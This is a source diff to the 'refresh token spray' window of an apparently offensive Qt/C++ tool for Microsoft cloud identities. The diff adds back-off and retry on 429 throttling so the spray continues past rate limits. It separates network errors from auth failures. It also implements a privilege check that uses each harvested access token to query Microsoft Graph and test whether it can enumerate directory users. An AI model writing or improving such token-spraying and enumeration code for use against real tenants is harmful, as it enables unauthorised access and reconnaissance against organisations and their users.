@@ -1,4 +1,6 @@
 #include "RefreshTokenSprayWindow.h"
+#include "TablePlaceholder.h"
+#include "StyleManager.h"
 #include "UserSelectorWidget.h"
 #include "TokenStore.h"
 #include "NetworkHelper.h"
@@ -7,6 +9,7 @@
 #include <QHeaderView>
 #include <QJsonDocument>
 #include <QJsonObject>
+#include <QJsonArray>
 #include <QFile>
 #include <QDir>
 #include <QCoreApplication>
@@ -112,11 +115,11 @@ void RefreshTokenSprayWindow::setupUi()
     auto *controlLayout = new QHBoxLayout();
 
     startBtn = new QPushButton("Start Spray", this);
-    startBtn->setStyleSheet("QPushButton { background-color: #28a745; color: white; font-weight: bold; padding: 8px 16px; }");
+    StyleManager::applySuccessStyle(startBtn);
     connect(startBtn, &QPushButton::clicked, this, &RefreshTokenSprayWindow::startSpray);
 
     cancelBtn = new QPushButton("Cancel", this);
-    cancelBtn->setStyleSheet("QPushButton { background-color: #dc3545; color: white; font-weight: bold; }");
+    StyleManager::applyDangerStyle(cancelBtn);
     cancelBtn->setEnabled(false);
     connect(cancelBtn, &QPushButton::clicked, this, &RefreshTokenSprayWindow::cancelSpray);
 
@@ -154,6 +157,7 @@ void RefreshTokenSprayWindow::setupUi()
     auto *resultsLayout = new QVBoxLayout(resultsGroup);
 
     resultsTable = new QTableWidget(0, 4, this);
+    new TablePlaceholder(resultsTable, "No apps tested yet — start a spray.");
     resultsTable->setHorizontalHeaderLabels({"App Name", "App ID", "Status", "Scopes / Error"});
     resultsTable->horizontalHeader()->setStretchLastSection(true);
     resultsTable->horizontalHeader()->setSectionResizeMode(QHeaderView::ResizeToContents);
@@ -316,8 +320,19 @@ void RefreshTokenSprayWindow::sprayApp(const QString &appName, const QString &ap
             return;
         }
 
-        QJsonDocument doc = QJsonDocument::fromJson(reply->readAll());
-        QJsonObject resp = doc.object();
+        const QByteArray body = reply->readAll();
+
+        // On 429, back off and retry this app instead of counting it a failure.
+        if (NetworkHelper::isThrottled(reply)) {
+            int retryMs = NetworkHelper::getRetryAfterMs(reply);
+            if (retryMs <= 0) retryMs = 5000;
+            appendLog(QString("[!] Throttled (429) on %1 — backing off %2s")
+                          .arg(appName).arg(retryMs / 1000.0, 0, 'f', 1), "#ffc107");
+            sprayTimer->start(retryMs);   // don't advance the index; retry this app
+            return;
+        }
+
+        const QJsonObject resp = QJsonDocument::fromJson(body).object();
 
         if (resp.contains("access_token")) {
             successCount++;
@@ -329,19 +344,75 @@ void RefreshTokenSprayWindow::sprayApp(const QString &appName, const QString &ap
             logSuccess(QString("SUCCESS: %1 (%2)").arg(appName, appId));
 
             if (checkPrivsCheckbox->isChecked()) {
-                // TODO: Could add privilege check here
+                checkPrivileges(appName, appId, resp["access_token"].toString());
             }
-        } else {
+        } else if (resp.contains("error")) {
+            // Real auth failure from the token endpoint (invalid_grant, etc.).
             failCount++;
             QString error = resp["error"].toString();
             QString desc = resp["error_description"].toString();
             if (desc.length() > 100) desc = desc.left(100) + "...";
             addResult(appName, appId, false, QString(), error.isEmpty() ? desc : error);
+        } else {
+            // No token and no error body means a network problem, not an auth result.
+            failCount++;
+            const QString netErr = reply->error() != QNetworkReply::NoError
+                                       ? reply->errorString()
+                                       : QStringLiteral("empty/invalid response");
+            addResult(appName, appId, false, QString(), QString("network error: %1").arg(netErr));
+            logError(QString("Network error testing %1: %2").arg(appName, netErr));
         }
 
         currentAppIndex++;
         int delay = delaySpinBox->value();
         sprayTimer->start(delay);
+    });
+}
+
+void RefreshTokenSprayWindow::checkPrivileges(const QString &appName, const QString &appId,
+                                              const QString &accessToken)
+{
+    Q_UNUSED(appId);
+
+    // Only probe if the token is actually for Graph. Otherwise Graph rejects it
+    // and it looks like "no privileges".
+    const QJsonObject claims = TokenStore::parseJwtPayload(accessToken);
+    const QString aud = claims.value("aud").toString();
+    const bool graphAud = aud.contains("graph.microsoft.com")
+                          || aud == QLatin1String("00000003-0000-0000-c000-000000000000");
+    if (!graphAud) {
+        appendLog(QString("    privileges: %1 token is not Graph-scoped (aud=%2) — skipped")
+                      .arg(appName, aud.isEmpty() ? QStringLiteral("unknown") : aud), "#888888");
+        return;
+    }
+
+    QNetworkRequest req = NetworkHelper::createBearerRequest(
+        QStringLiteral("https://graph.microsoft.com/v1.0/users?$top=1&$select=id,userPrincipalName"),
+        accessToken);
+
+    QNetworkReply *reply = net->get(req);
+    if (!reply) {
+        return;
+    }
+    activeReplies.append(reply);
+
+    connect(reply, &QNetworkReply::finished, this, [this, reply, appName]() {
+        activeReplies.removeOne(reply);
+        reply->deleteLater();
+
+        const int status = reply->attribute(QNetworkRequest::HttpStatusCodeAttribute).toInt();
+        if (status == 200) {
+            const int n = QJsonDocument::fromJson(reply->readAll())
+                              .object().value("value").toArray().size();
+            appendLog(QString("    privileges: %1 CAN enumerate directory users (Graph 200, %2 sampled)")
+                          .arg(appName).arg(n), "#00ff00");
+        } else if (status == 403) {
+            appendLog(QString("    privileges: %1 token accepted but lacks user-read (Graph 403)")
+                          .arg(appName), "#ffc107");
+        } else {
+            appendLog(QString("    privileges: %1 Graph probe returned HTTP %2")
+                          .arg(appName).arg(status), "#888888");
+        }
     });
 }
 
